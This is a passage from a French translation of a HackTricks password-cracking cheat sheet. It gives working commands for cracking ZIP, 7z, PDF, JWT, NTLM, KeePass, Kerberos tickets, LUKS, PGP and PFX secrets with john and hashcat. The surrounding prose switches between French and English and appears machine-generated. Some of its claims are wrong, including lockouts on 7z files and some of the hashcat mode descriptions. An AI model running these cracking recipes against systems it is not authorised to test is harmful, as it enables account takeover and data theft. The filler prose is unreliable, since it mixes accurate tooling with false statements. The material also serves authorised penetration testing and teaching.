./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

Le format de fichier 7z est un format d'archivage open source qui offre une compression élevée et une sécurité renforcée. Il est couramment utilisé pour compresser et décompresser des fichiers volumineux. Dans le contexte du piratage, le format 7z peut être utilisé pour stocker des fichiers sensibles ou des informations volées.

#### Attaque par force brute sur les fichiers 7z

L'attaque par force brute est une technique couramment utilisée pour tenter de deviner un mot de passe en essayant toutes les combinaisons possibles. Dans le cas des fichiers 7z, une attaque par force brute peut être utilisée pour essayer de deviner le mot de passe d'un fichier compressé.

Pour effectuer une attaque par force brute sur un fichier 7z, vous pouvez utiliser des outils spécialisés tels que "7z Cracker" ou "John the Ripper". Ces outils essaieront automatiquement toutes les combinaisons possibles de mots de passe jusqu'à ce qu'ils trouvent le bon.

Il est important de noter que l'attaque par force brute peut prendre beaucoup de temps, en fonction de la longueur et de la complexité du mot de passe. Il est également important de souligner que l'attaque par force brute est une activité illégale, sauf si vous avez l'autorisation explicite du propriétaire du fichier.

#### Prévention des attaques par force brute

Pour prévenir les attaques par force brute sur les fichiers 7z, il est recommandé d'utiliser des mots de passe forts et complexes. Un mot de passe fort doit être composé d'une combinaison de lettres majuscules et minuscules, de chiffres et de caractères spéciaux. Il est également recommandé d'éviter d'utiliser des mots courants ou des informations personnelles dans le mot de passe.

De plus, il est recommandé de limiter le nombre de tentatives de connexion autorisées avant de verrouiller le fichier 7z. Cela peut être fait en utilisant des paramètres de sécurité appropriés lors de la création du fichier 7z.

Enfin, il est important de garder à jour les outils de sécurité et les logiciels de compression utilisés pour manipuler les fichiers 7z. Les mises à jour régulières peuvent inclure des correctifs de sécurité qui renforcent la protection contre les attaques par force brute.
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
# Brute Force

La méthode de force brute est une technique couramment utilisée en piratage informatique pour tenter de deviner un mot de passe en essayant toutes les combinaisons possibles jusqu'à ce que la bonne soit trouvée. Cette méthode est souvent utilisée lorsque d'autres méthodes, telles que l'ingénierie sociale ou l'exploitation de vulnérabilités, ont échoué.

La force brute peut être utilisée pour attaquer différents types de systèmes, tels que les comptes en ligne, les réseaux sans fil, les fichiers chiffrés, etc. Elle est particulièrement efficace lorsque les mots de passe sont faibles ou prévisibles.

Il existe plusieurs outils disponibles pour effectuer des attaques par force brute, tels que Hydra, Medusa et John the Ripper. Ces outils automatisent le processus en essayant différentes combinaisons de mots de passe à une vitesse élevée.

Cependant, il convient de noter que la méthode de force brute peut être très lente et nécessite souvent beaucoup de temps et de ressources pour réussir. De plus, elle peut être détectée par des systèmes de sécurité qui bloquent les tentatives répétées de connexion.

Il est important de noter que l'utilisation de la méthode de force brute pour accéder à des systèmes ou des comptes sans autorisation est illégale et peut entraîner des poursuites judiciaires. La méthode de force brute doit être utilisée uniquement à des fins légales, telles que les tests de pénétration autorisés ou la récupération de mots de passe oubliés.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### Mot de passe du propriétaire PDF

Pour craquer un mot de passe du propriétaire PDF, consultez ceci : [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### Crackage NTLM

La méthode de craquage NTLM est une technique utilisée pour déchiffrer les mots de passe chiffrés en utilisant le protocole NTLM (NT LAN Manager). Le protocole NTLM est utilisé par les systèmes d'exploitation Windows pour stocker les mots de passe des utilisateurs.

Le craquage NTLM consiste à essayer différentes combinaisons de mots de passe jusqu'à ce que le mot de passe correct soit trouvé. Cette méthode est souvent utilisée lorsque les mots de passe sont stockés de manière non sécurisée ou lorsque les politiques de mot de passe sont faibles.

Il existe plusieurs outils et techniques disponibles pour effectuer le craquage NTLM, notamment l'utilisation de dictionnaires de mots de passe, de tables arc-en-ciel et de méthodes de force brute. Les dictionnaires de mots de passe contiennent une liste de mots couramment utilisés, tandis que les tables arc-en-ciel sont des bases de données précalculées contenant des valeurs de hachage de mots de passe.

La méthode de force brute consiste à essayer toutes les combinaisons possibles de caractères jusqu'à ce que le mot de passe correct soit trouvé. Cependant, cette méthode peut être très lente et nécessite beaucoup de ressources informatiques.

Il est important de noter que le craquage NTLM est une activité illégale sans autorisation appropriée. Il est essentiel de respecter les lois et les réglementations en vigueur lors de l'utilisation de ces techniques.
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
# Keepass

Keepass est un gestionnaire de mots de passe open source qui permet de stocker en toute sécurité vos mots de passe et autres informations sensibles. Il utilise un algorithme de chiffrement fort pour protéger vos données et nécessite un mot de passe principal pour accéder à votre base de données.

L'une des méthodes couramment utilisées pour pirater un fichier Keepass est l'attaque par force brute. Cette technique consiste à essayer toutes les combinaisons possibles de mots de passe jusqu'à ce que le bon soit trouvé. Cela peut être un processus long et fastidieux, mais il peut être efficace si le mot de passe est faible ou prévisible.

Il existe plusieurs outils disponibles pour effectuer une attaque par force brute sur un fichier Keepass. Certains de ces outils sont spécifiquement conçus pour cela, tandis que d'autres sont des outils de piratage plus généraux qui peuvent également être utilisés pour cette tâche.

Lorsque vous utilisez un outil de force brute pour pirater un fichier Keepass, il est important de prendre certaines précautions. Tout d'abord, assurez-vous d'avoir l'autorisation légale de pirater le fichier. Ensuite, utilisez un ordinateur puissant avec suffisamment de ressources pour effectuer l'attaque. Enfin, soyez patient, car cela peut prendre du temps pour trouver le bon mot de passe.

Il est également important de noter que l'utilisation d'une attaque par force brute pour pirater un fichier Keepass est illégale sans autorisation appropriée. Il est essentiel de respecter les lois et réglementations en vigueur dans votre pays ou votre juridiction.

En conclusion, Keepass est un excellent outil pour stocker en toute sécurité vos mots de passe, mais il est important de prendre des mesures pour protéger votre base de données contre les attaques par force brute.
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Le keberoasting est une technique d'attaque utilisée pour récupérer les mots de passe faibles des comptes d'utilisateurs dans un environnement Active Directory. Cette méthode exploite une vulnérabilité dans le chiffrement des mots de passe Kerberos.

L'attaque commence par l'identification des comptes d'utilisateurs qui utilisent des méthodes de chiffrement Kerberos faibles, telles que RC4. Ensuite, l'attaquant extrait les informations de hachage des mots de passe de ces comptes à partir du trafic réseau ou de la base de données Active Directory.

Une fois que l'attaquant a obtenu les informations de hachage des mots de passe, il peut les utiliser pour effectuer une attaque de force brute hors ligne. Cela implique de tester différentes combinaisons de mots de passe jusqu'à ce que le mot de passe correct soit trouvé.

Pour se protéger contre le keberoasting, il est recommandé d'utiliser des méthodes de chiffrement Kerberos plus solides, telles que AES. De plus, il est important de mettre en place des politiques de mots de passe robustes et de sensibiliser les utilisateurs à l'importance de choisir des mots de passe forts.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Image Lucks

#### Méthode 1

Installer: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Méthode 2
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
Un autre tutoriel sur le BF Luks : [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### Clé privée PGP/GPG

A PGP/GPG private key is a crucial component of asymmetric encryption. It is used to decrypt messages that have been encrypted with the corresponding public key. The private key must be kept secret and secure, as it grants access to sensitive information.

Brute-forcing a PGP/GPG private key involves systematically trying all possible combinations until the correct key is found. This method is time-consuming and resource-intensive, as the number of possible combinations is extremely large.

To perform a brute-force attack on a PGP/GPG private key, various tools and resources can be utilized. These include specialized software, hardware accelerators, and cloud-based services. The choice of tools depends on the attacker's resources and objectives.

It is important to note that brute-forcing a PGP/GPG private key is a highly complex and challenging task. The encryption algorithms used in PGP/GPG are designed to withstand such attacks, making brute-forcing a time-consuming and computationally expensive process.

To protect against brute-force attacks, it is recommended to use strong and unique passphrases for PGP/GPG private keys. Additionally, regularly updating and rotating keys can further enhance security.
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### Clé maître DPAPI

Utilisez [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) puis john

### Colonne protégée par mot de passe dans Open Office

Si vous avez un fichier xlsx avec une colonne protégée par un mot de passe, vous pouvez la déprotéger :

* **Téléchargez-le sur Google Drive** et le mot de passe sera automatiquement supprimé
* Pour le **supprimer** manuellement :
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### Certificats PFX

PFX (Personal Information Exchange) est un format de fichier utilisé pour stocker et transporter des certificats numériques, des clés privées et des chaînes de certificats. Les certificats PFX sont couramment utilisés dans les environnements Windows pour sécuriser les communications et les transactions en ligne.

Les certificats PFX peuvent être protégés par un mot de passe, ce qui ajoute une couche de sécurité supplémentaire. Lorsqu'un certificat PFX est utilisé, le mot de passe doit être fourni pour accéder à la clé privée et aux informations du certificat.

Les certificats PFX peuvent être générés à l'aide d'outils de génération de certificats, tels que OpenSSL. Une fois générés, ils peuvent être utilisés pour sécuriser les connexions SSL/TLS, les signatures numériques et d'autres opérations cryptographiques.

Lors de l'utilisation de certificats PFX, il est important de prendre des mesures de sécurité appropriées pour protéger le fichier et le mot de passe associé. Cela inclut le stockage sécurisé du fichier PFX, la limitation de l'accès aux personnes autorisées et la rotation régulière des certificats pour éviter les compromissions potentielles.

En résumé, les certificats PFX sont un moyen courant de sécuriser les communications et les transactions en ligne dans les environnements Windows. Ils sont stockés dans un format de fichier spécifique et peuvent être protégés par un mot de passe pour une sécurité accrue.
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et automatiser facilement des flux de travail alimentés par les outils communautaires les plus avancés au monde.\
Obtenez un accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Outils

**Exemples de hachages :** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Identificateur de hachage
```bash
hash-identifier
> <HASH>
```
### Listes de mots

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Outils de génération de listes de mots**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Générateur avancé de combinaisons de touches avec des caractères de base, une disposition de touches et des itinéraires configurables.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### Mutation de John

Lisez _**/etc/john/john.conf**_ et configurez-le.
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Attaques Hashcat

* **Attaque par liste de mots** (`-a 0`) avec des règles

**Hashcat** est déjà livré avec un **dossier contenant des règles**, mais vous pouvez trouver [**d'autres règles intéressantes ici**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Attaque de combinaison de listes de mots**

Il est possible de **combiner 2 listes de mots en une seule** avec hashcat.\
Si la liste 1 contenait le mot **"hello"** et que la deuxième contenait 2 lignes avec les mots **"world"** et **"earth"**. Les mots `helloworld` et `helloearth` seront générés.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Attaque par masque** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Attaque par liste de mots + masque (`-a 6`) / Attaque par masque + liste de mots (`-a 7`)
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Modes de Hashcat

Hashcat est un outil de craquage de mots de passe qui prend en charge différents modes pour attaquer les hachages de mots de passe. Chaque mode est conçu pour cibler un type spécifique de hachage et utilise des techniques de craquage adaptées à ce type.

Voici quelques-uns des modes les plus couramment utilisés dans Hashcat :

- **Mode de hachage simple (0)** : Ce mode est utilisé pour les hachages de mots de passe non salés. Il utilise des attaques de force brute et de dictionnaire pour craquer les mots de passe.

- **Mode de hachage salé (10)** : Ce mode est utilisé pour les hachages de mots de passe salés. Il utilise des attaques de force brute et de dictionnaire, en tenant compte du sel ajouté au mot de passe.

- **Mode de hachage de Windows (1000)** : Ce mode est utilisé pour les hachages de mots de passe utilisés par les systèmes d'exploitation Windows. Il utilise des attaques spécifiques pour craquer les hachages de mots de passe Windows.

- **Mode de hachage de Linux (1800)** : Ce mode est utilisé pour les hachages de mots de passe utilisés par les systèmes d'exploitation Linux. Il utilise des attaques spécifiques pour craquer les hachages de mots de passe Linux.

- **Mode de hachage de base de données (20)** : Ce mode est utilisé pour les hachages de mots de passe stockés dans les bases de données. Il utilise des attaques spécifiques pour craquer les hachages de mots de passe de base de données.

- **Mode de hachage de réseau sans fil (2500)** : Ce mode est utilisé pour les hachages de mots de passe utilisés par les réseaux sans fil. Il utilise des attaques spécifiques pour craquer les hachages de mots de passe de réseau sans fil.

Ces modes de Hashcat offrent une flexibilité pour attaquer différents types de hachages de mots de passe. Il est important de choisir le bon mode en fonction du type de hachage que vous souhaitez craquer.
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# Cracking Linux Hashes - Fichier /etc/shadow

## Introduction

Le fichier `/etc/shadow` est un fichier système utilisé par les systèmes d'exploitation Linux pour stocker les mots de passe des utilisateurs. Ce fichier est essentiellement utilisé pour sécuriser les mots de passe en les stockant sous forme de hachages plutôt que de les stocker en texte brut.

## Méthodologie de force brute

La méthode de force brute est une technique couramment utilisée pour craquer les hachages de mots de passe. Elle consiste à essayer toutes les combinaisons possibles de caractères jusqu'à ce que le hachage correspondant soit trouvé.

Voici les étapes générales pour effectuer une attaque de force brute sur les hachages Linux :

1. Récupérer le fichier `/etc/shadow` contenant les hachages des mots de passe.
2. Extraire les hachages des mots de passe du fichier.
3. Utiliser un programme de craquage de mots de passe, tel que John the Ripper ou Hashcat, pour effectuer l'attaque de force brute.
4. Configurer le programme de craquage de mots de passe avec les paramètres appropriés, tels que l'algorithme de hachage utilisé et les règles de génération de mots de passe.
5. Lancer l'attaque de force brute et attendre que le programme trouve le mot de passe correspondant au hachage.
6. Une fois le mot de passe trouvé, l'utiliser pour accéder au compte utilisateur correspondant.

## Ressources supplémentaires

Voici quelques ressources supplémentaires qui peuvent être utiles lors de la craquage des hachages Linux :

- [John the Ripper](https://www.openwall.com/john/)
- [Hashcat](https://hashcat.net/hashcat/)

Il est important de noter que le craquage de hachages de mots de passe est une activité illégale sans autorisation appropriée. Ces techniques doivent être utilisées uniquement à des fins légales, telles que les tests de pénétration autorisés ou la récupération de mots de passe oubliés.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Brute Force

Brute force is a common method used to crack Windows hashes. It involves systematically trying every possible combination of characters until the correct password is found.

## Tools

There are several tools available for brute forcing Windows hashes, including:

- **John the Ripper**: A popular password cracking tool that supports various hash types, including Windows LM and NTLM hashes.
- **Hashcat**: A powerful password recovery tool that can handle a wide range of hash types, including Windows hashes.
- **Cain and Abel**: A versatile tool that can be used for various password cracking techniques, including brute forcing Windows hashes.

## Methodology

The following steps outline a typical brute force attack on Windows hashes:

1. **Obtain the Hash**: Obtain the Windows hash that you want to crack. This can be done by extracting the hash from the Windows SAM file or by using tools like Mimikatz to dump the hashes from memory.

2. **Choose a Tool**: Select a suitable tool for brute forcing Windows hashes. Consider factors such as hash type support, performance, and ease of use.

3. **Create a Wordlist**: Generate or obtain a wordlist containing potential passwords. This can be a combination of common passwords, dictionary words, and custom wordlists.

4. **Configure the Tool**: Set up the chosen tool with the necessary parameters, such as the hash type, wordlist location, and any additional options.

5. **Start the Attack**: Initiate the brute force attack by running the tool. It will systematically try each password combination from the wordlist until a match is found.

6. **Monitor Progress**: Monitor the progress of the attack and keep track of any passwords that are successfully cracked.

7. **Optimize**: If the initial brute force attack is unsuccessful, consider optimizing the attack by adjusting parameters such as the wordlist, attack mode, or using additional techniques like rule-based attacks.

8. **Crack the Hash**: Once the correct password is found, use it to authenticate and gain access to the target system.

## Conclusion

Brute forcing Windows hashes can be an effective method for cracking passwords, but it can be time-consuming and resource-intensive. It is important to use strong and unique passwords to protect against brute force attacks. Additionally, organizations should implement measures such as account lockouts and multi-factor authentication to mitigate the risk of successful brute force attacks.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# Brute Force

## Introduction

Brute force is a common method used to crack application hashes. It involves systematically trying all possible combinations of characters until the correct password is found. This technique can be effective, but it can also be time-consuming and resource-intensive.

## Methodology

1. **Select the Hash Algorithm**: Determine the hash algorithm used by the application. Common hash algorithms include MD5, SHA-1, and SHA-256.

2. **Create a Wordlist**: Generate a wordlist containing potential passwords. This can be done by using common password dictionaries or by creating custom wordlists based on the target application's characteristics.

3. **Hash the Wordlist**: Hash each password in the wordlist using the same algorithm used by the application. This will create a list of hashed passwords.

4. **Compare Hashes**: Compare the hashed passwords from the wordlist with the target application's hash. If a match is found, the corresponding password has been cracked.

5. **Brute Force**: If no match is found, start the brute force attack by systematically trying all possible combinations of characters. This can be done by iterating through all possible password lengths and characters.

6. **Optimize**: To speed up the brute force attack, consider using techniques such as parallel processing, distributed computing, or utilizing cloud/SaaS platforms.

## Resources

- **Password Dictionaries**: Use pre-existing password dictionaries such as rockyou.txt or create custom dictionaries based on the target application's characteristics.

- **Hashcat**: Hashcat is a popular password cracking tool that supports a wide range of hash algorithms and attack modes.

- **John the Ripper**: John the Ripper is another powerful password cracking tool that can be used for brute force attacks.

- **Rainbow Tables**: Rainbow tables are precomputed tables of hash values that can be used to quickly crack passwords. They can be generated using tools like RainbowCrack.

## Conclusion

Brute force is a powerful technique for cracking application hashes, but it can be time-consuming and resource-intensive. It is important to use optimized methods and tools to increase the chances of success. Additionally, it is crucial to ensure that the target application's security measures are strong enough to withstand brute force attacks.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez un accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
